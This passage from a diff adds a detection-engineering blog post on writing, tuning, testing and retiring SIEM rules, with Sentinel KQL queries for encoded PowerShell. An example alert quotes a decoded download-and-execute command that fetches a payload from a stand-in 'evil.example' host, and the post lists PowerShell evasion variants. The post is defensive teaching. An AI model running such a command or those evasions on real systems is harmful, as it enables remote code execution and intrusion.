+    - https://www.mandiant.com/resources/obfuscation-in-the-wild
+  ```
+
+  ### The Workflow
+
+  ```
+  1. Write detection in YAML → local branch
+  2. Test against sample data (known-good + known-bad)
+  3. Open PR → peer review (at minimum, one other detection engineer)
+  4. Merge → CI/CD deploys to SIEM in log-only mode
+  5. 2-week observation period
+  6. Second PR to activate alerting
+  ```
+
+  Every change is traceable. When something breaks at 2 AM, you can `git log` and find out exactly what changed, when, and who approved it. When a new analyst asks "why is this exclusion here?" the answer is in the commit history, not in someone's head.
+
+  ### Git Repository Structure
+
+  ```
+  detections/
+  ├── execution/
+  │   ├── encoded-powershell.yml
+  │   ├── mshta-execution.yml
+  │   └── wmic-process-create.yml
+  ├── persistence/
+  │   ├── scheduled-task-creation.yml
+  │   ├── registry-run-key.yml
+  │   └── new-service-creation.yml
+  ├── credential-access/
+  │   ├── lsass-access.yml
+  │   └── sam-registry-access.yml
+  ├── lateral-movement/
+  │   ├── psexec-usage.yml
+  │   └── wmi-remote-execution.yml
+  └── _tests/
+      ├── encoded-powershell.test.yml
+      └── lsass-access.test.yml
+  ```
+
+  Structure by MITRE tactic. Tests live alongside rules. CI validates that all YAML is parseable and test data exists for each rule.
+
+  ## Lesson 2: Tune Before You Ship (The 2-Week Rule)
+
+  I run every new rule in "log only" mode for at least 2 weeks before enabling alerts. No exceptions. Here's the exact process:
+
+  ### Week 1: Volume and Noise Assessment
+
+  ```kql
+  // Daily alert volume during observation period
+  DetectionLogs_CL
+  | where RuleName_s == "encoded-powershell-execution"
+  | where TimeGenerated > ago(7d)
+  | summarize
+      DailyCount = count() by bin(TimeGenerated, 1d)
+  | render timechart
+  ```
+
+  If daily volume is > 50, the rule is probably too broad. If it's 0, either the threat doesn't exist in your environment (good) or your log sources are broken (bad). Verify which one.
+
+  ### Week 1: False Positive Sampling
+
+  Sample at least 20% of triggers. For each one, classify:
+
+  | Category | Action |
+  |---|---|
+  | True positive | Validate detection logic caught the right thing |
+  | Benign true positive | Correct behavior detected, but it's expected (e.g., IT admin) → add exclusion with documentation |
+  | False positive &mdash; fixable | The query logic is wrong → fix the query |
+  | False positive &mdash; structural | The log source doesn't provide enough context to distinguish good from bad → consider a different data source or retire the detection |
+
+  ### Week 2: Targeted Testing
+
+  If the rule survived week 1 at an acceptable volume and FP rate, I run targeted tests:
+
+  1. **True positive validation** &mdash; Execute the technique in a lab/test environment (or with ART / Caldera) and confirm the rule fires.
+  2. **Evasion check** &mdash; Try 2–3 known evasion variants and see if the rule catches them. For the encoded PowerShell example:
+     - Standard `-enc` flag → should fire
+     - `-e` short form → should fire
+     - PowerShell via `cmd.exe /c powershell` → should fire (check parent process chain)
+     - `pwsh.exe` (PowerShell 7) → should fire
+     - Encoded command loaded from a file (no command line argument) → will NOT fire (different detection needed — script block logging)
+
+  3. **Performance check** &mdash; Run the query against 30 days of data and measure execution time. If it takes > 60 seconds on a 30-day window, optimize the query before enabling it on a real-time schedule.
+
+  **A rule that fires 200 times a day with 95% false positives is worse than no rule at all.** It trains analysts to ignore alerts &mdash; which is the exact opposite of what you want. I'd rather have 50 high-fidelity rules than 500 noisy ones.
+
+  ## Lesson 3: Context Is the Detection
+
+  The difference between a noisy alert and an actionable one is context. Not context that an analyst adds after triaging &mdash; context baked into the detection query itself.
+
+  ### Bad Alert
+
+  ```
+  Title: Suspicious PowerShell Execution
+  Severity: Medium
+  Host: WORKSTATION-47
+  User: jsmith
+  Command: powershell.exe -enc dABlAHMAdAA=
+  ```
+
+  An analyst gets this and now has to spend 10 minutes answering: Who is jsmith? Is this a developer? Is WORKSTATION-47 a server or a laptop? Has jsmith ever used PowerShell before? What did the encoded command actually do?
+
+  ### Good Alert
+
+  ```
+  Title: Encoded PowerShell by Non-Admin on Finance Endpoint
+  Severity: High
+  
+  Host: FIN-WS-047 (Finance department workstation)
+  User: jsmith (Accounts Payable — no admin privileges, no PowerShell history)
+  
+  Decoded command: IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')
+  
+  Context:
+  → User has ZERO prior PowerShell executions in 90 days
+  → Endpoint is in the Finance OU (high-value target)
+  → Source process: WINWORD.EXE (Word spawned PowerShell — classic macro behavior)
+  → Time: 22:47 UTC (outside business hours for this user's timezone)
+  → No change tickets or deployment windows active
+  
+  Risk Score: 92/100
+  Recommended Action: Isolate endpoint, investigate parent process chain
+  ```
+
+  Same underlying event. Completely different analyst experience. The second alert took me an extra 30 minutes to write. It saves analysts 10+ minutes on every single trigger, for the lifetime of the detection. That math works out fast.
+
+  ### How to Build Context Into Your Queries
+
+  In Sentinel, I use `join` and `lookup` to attach context at detection time:
+
+  ```kql
+  let adminUsers = 
+      IdentityInfo
+      | where AssignedRoles has "Admin" or GroupMembership has "Domain Admins"
+      | distinct AccountUPN;
+  let userHistory =
+      DeviceProcessEvents
+      | where Timestamp > ago(90d)
+      | where FileName in~ ("powershell.exe", "pwsh.exe")
+      | summarize PriorPSExecutions = count() by AccountName;
+  DeviceProcessEvents
+  | where Timestamp > ago(1h)
+  | where FileName in~ ("powershell.exe", "pwsh.exe")
+  | where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "FromBase64String")
+  | where AccountName !in (adminUsers)
+  | lookup kind=leftouter userHistory on AccountName
+  | extend PriorPSExecutions = coalesce(PriorPSExecutions, 0)
+  | lookup kind=leftouter (
+      DeviceInfo
+      | summarize arg_max(Timestamp, *) by DeviceName
+      | project DeviceName, MachineGroup, OSPlatform
+  ) on DeviceName
+  | extend
+      IsAfterHours = hourofday(Timestamp) < 7 or hourofday(Timestamp) > 19,
+      ParentProcess = InitiatingProcessFileName,
+      IsOfficeSpawn = InitiatingProcessFileName in~ (
+          "WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE", "OUTLOOK.EXE"
+      )
+  | extend RiskScore = 
+      iif(PriorPSExecutions == 0, 30, 0) +
+      iif(IsAfterHours, 15, 0) +
+      iif(IsOfficeSpawn, 25, 0) +
+      iif(MachineGroup has_any ("Finance", "Executive", "HR"), 20, 0) +
+      iif(ProcessCommandLine has "DownloadString" or ProcessCommandLine has "IEX", 20, 0)
+  | where RiskScore > 40
+  | project
+      Timestamp,
+      DeviceName,
+      MachineGroup,
+      AccountName,
+      ParentProcess,
+      ProcessCommandLine,
+      PriorPSExecutions,
+      IsAfterHours,
+      IsOfficeSpawn,
+      RiskScore
+  | sort by RiskScore desc
+  ```
+
+  This single query produces alerts that analysts can act on in under 2 minutes. The investment is in the query complexity, but you pay that cost once. The payoff compounds with every alert.
+
+  ## Lesson 4: Coverage ≠ Detection
+
+  This one took me the longest to internalize. Having a rule mapped to T1059.001 (PowerShell) does not mean you can detect PowerShell abuse. It means you have a query that fires when a specific pattern appears in a specific log source.
+
+  ### The Coverage Illusion
+
+  I've audited environments that claimed "90% MITRE ATT&CK coverage" based on their SIEM rule count. When we ran Atomic Red Team against them:
+
+  - 40% of techniques flagged as "covered" didn't fire because the log source wasn't actually collecting the right events (endpoint agent wasn't deployed on the target, Sysmon config didn't include the event ID, audit policy wasn't enabled).
+  - 15% fired but were auto-closed by noisy playbooks or buried in a 2000-alert backlog.
+  - 10% fired correctly but the rule was so broad that the alert didn't contain enough context to investigate.
+
+  Actual effective coverage was closer to 25%. On paper, 90%. In reality, 25%. That gap is where breaches live.
+
+  ### What Real Coverage Requires
+
+  For every detection, validate the entire chain:
+
+  ```
+  Technique executed on endpoint
+      ↓
+  Endpoint agent/OS generates the log
+      ↓
+  Log is collected and forwarded to SIEM
+      ↓
+  Log arrives within acceptable latency (< 5 min)
+      ↓
+  Detection rule fires on the log
+      ↓
+  Alert contains enough context  to investigate
+      ↓
+  Alert is routed to the right queue/analyst
+      ↓
+  Analyst can take action within SLA
+  ```
+
+  If any link in that chain is broken, you don't have coverage. You have a checkbox.
+
+  ### Testing Coverage Honestly
+
+  Monthly purple team exercise structure that works:
+
+  ```
+  1. Red team picks 5 techniques from agreed-upon scope
+  2. Red team executes techniques on representative endpoints
+  3. Blue team is NOT informed of timing or specifics
+  4. After 48-hour window:
+     - Red team provides execution log
+     - Blue team provides detection log
+     - Compare: what fired, what didn't, what fired late
+  5. Gap analysis → new detections or log source fixes
+  6. Retest gaps next month
+  ```
+
+  I maintain a validation spreadsheet (boring, effective):
+
+  ```
+  | Technique     | Rule ID              | Last Tested | Result         | Log Source Confirmed | Notes                              |
+  |---------------|----------------------|-------------|----------------|----------------------|------------------------------------|
+  | T1059.001     | encoded-powershell   | 2025-11-15  | PASS           | Yes - Sysmon EID 1   | Catches -enc and -e variants       |
+  | T1059.001     | scriptblock-logging  | 2025-11-15  | PASS           | Yes - PS 4104        | Catches fileless/in-memory         |
+  | T1003.001     | lsass-access         | 2025-11-15  | PARTIAL        | Yes - Sysmon EID 10  | Misses indirect access via comsvcs |
+  | T1053.005     | schtask-creation     | 2025-10-22  | FAIL           | NO - audit policy    | Need to enable object access audit |
+  ```
+
+  If the "Last Tested" column is blank or > 90 days old, you don't know if the detection works. Assume it doesn't until you prove otherwise.
+
+  ## Lesson 5: Retire Aggressively
+
+  This is counterintuitive for most people. You spent time building the detection, so disabling it feels like waste. But a detection that's generating noise or covering a technique that's no longer relevant to your environment is actively harmful:
+
+  - It consumes SIEM compute resources (query costs add up)
+  - It adds to alert volume that analysts have to wade through
+  - It gives a false sense of coverage
+  - It increases maintenance burden without providing value
+
+  ### The Quarterly Review
+
+  Every quarter, review every active rule against these criteria:
+
+  ```
+  For each active detection:
+
+  1. Has it fired in the last 90 days?
+     NO → Why not? Is the technique rare, or is the log source broken?
+         → If log source broken → fix or retire
+         → If technique is genuinely rare → keep but mark "low frequency"
+
+  2. When it fired, did it produce true positives?
+     NO → Is it tunable? Can we fix the false positives?
+         → If not → retire
+         → If yes → create tuning ticket, set 30-day deadline
+
+  3. Is the underlying threat still relevant?
+     → Check threat intel: are actors still using this technique?
+     → Is the vulnerable software/config still in your environment?
+     → If neither → retire
+
+  4. Is the log source still reliable?
+     → Query the source: is data still flowing at expected volume?
+     → Has the schema changed? (vendor updates can break parsers silently)
+  ```
+
+  **I typically retire 10–15% of rules each quarter.** After two years, if you aren't retiring, your rule set is accumulating debt. A lean, trusted rule set of 200 rules beats a bloated, noisy set of 800 every single time.
+
+  ### What Retirement Looks Like
+
+  Don't delete. Disable and archive:
+
+  ```
+  1. Change status in YAML to "retired"
+  2. Add retirement reason and date
+  3. Commit to Git (full history preserved)
+  4. Disable in SIEM
+  5. Move to detections/_retired/ directory
+  ```
+
+  If the threat re-emerges six months later, you can pull it out of the archive, update it, and redeploy in an hour instead of rewriting from scratch.
+
+  ## The Detection Lifecycle (Complete)
+
+  Every detection I build follows this lifecycle. No shortcuts.
+
+  ```
+  ┌─ 1. HYPOTHESIS
+  │     "We should detect X because Y"
+  │     Requires: threat intel justification, MITRE ATT&CK mapping
+  │
+  ├─ 2. RESEARCH
+  │     Study the technique: how does it work? What artifacts does it leave?
+  │     Collect samples: Atomic Red Team, MITRE Engenuity evaluations, real incident data
+  │     Identify log sources: what events, which fields, minimum audit config
+  │
+  ├─ 3. WRITE
+  │     YAML rule file with:
+  │     → Query optimized for performance
+  │     → Context enrichment built into the query
+  │     → False positive notes from research
+  │     → Clearly stated assumptions
+  │
+  ├─ 4. TEST (Pre-deployment)
+  │     Run against:
+  │     → Known-bad data (must fire)
+  │     → Known-good data (must NOT fire)
+  │     → Edge cases from research (document results)
+  │
+  ├─ 5. DEPLOY (Log-only)
+  │     Push via CI/CD to SIEM in observation mode
+  │     No alerts to analysts yet
+  │
+  ├─ 6. TUNE (2-week window)
+  │     Daily review of triggers
+  │     Classify: TP / benign TP / FP (fixable) / FP (structural)
+  │     Add exclusions WITH DOCUMENTATION
+  │     Adjust thresholds based on data, not intuition
+  │
+  ├─ 7. ACTIVATE
+  │     Enable alerting
+  │     Verify routing: right queue, right severity, right team
+  │     Confirm runbook exists for response
+  │
+  ├─ 8. MEASURE (Monthly)
+  │     Track: volume, TP rate, FP rate, MTTR, analyst feedback
+  │     Compare against baseline
+  │
+  ├─ 9. REVIEW (Quarterly)
+  │     Relevance check (threat still active?)
+  │     Performance check (query still efficient?)
+  │     Coverage check (log sources still reliable?)
+  │     Feedback incorporation from analyst team
+  │
+  └─ 10. RETIRE (When warranted)
+       Disable, archive, document reason
+       Preserve in Git for potential reactivation
+  ```
+
+  Every step is documented. Every decision is traceable. That's what separates detection engineering from detection guessing.
+
+  ## One More Thing: Talk to Your Analysts
+
+  The best detection engineers I know spend at least 2 hours per week sitting with Tier 1 and Tier 2 analysts. Not reviewing metrics &mdash; actually watching them triage alerts. You'll learn:
+
+  - Which alerts they instinctively trust and which they immediately dismiss
+  - Where they waste time on context gathering (→ build it into the query)
+  - What questions they ask that the alert doesn't answer (→ add those fields)
+  - Which runbooks don't match reality (→ update them)
+
+  Detection engineering without analyst feedback is just writing queries in a vacuum. The feedback loop is the most important part of the whole process.
+
+  ---
+
+  *Want to discuss detection engineering, compare SIEM strategies, or need help with your rule set? Feel free to [reach out](index.html#contact).*
   </script>
 
   <script src="js/blog.js"></script>
